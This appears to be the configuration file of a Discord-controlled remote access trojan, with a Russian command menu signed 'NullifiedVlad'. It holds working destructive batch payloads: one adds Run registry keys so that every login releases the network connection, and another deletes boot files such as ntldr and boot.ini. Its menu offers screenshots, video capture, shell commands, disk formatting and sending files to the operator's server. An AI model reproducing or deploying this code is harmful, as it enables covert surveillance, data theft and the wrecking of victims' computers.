token = '' #Вставьте токен бота
channel =  #вставьте id канала

disable_internet = '''
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" '''


system_kill = '''
echo @off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini'''

helpmessage = '''
-=**Configuration Administrarion Tool**=-
**/move** (X) (Y) (time) - передвинуть курсор.
**/click** - сделать левый клик мышкой.
**/write** (message) - напечатать что-то.
**/send** (how_many) - нажать клавишу несколько раз.
**/screenshot** - сделать скриншот экрана.
**/playsound** (1-2) - проиграть звук.
**/changelanguage** - изменить раскладку клавиатуры.
**/help** - выводит это сообщение.
**/processlist** - выводит список процессов.
**/command** - выполнить комманду в терминале.
**/kill** (process) - закрыть принудительно процесс.
**/video** - захват видео.
**/delete** (file) - удалить файл.
**/format** (disk) - отформатировать диск.
**/inet_kill**  - убить интернет соединение (навсегда).
**/copy** (way) - отправляет файл к вам на сервер.
**/system_kill** - удаляет важные файлы для запуска.
-==== **Made by NullifiedVlad** ====-'''
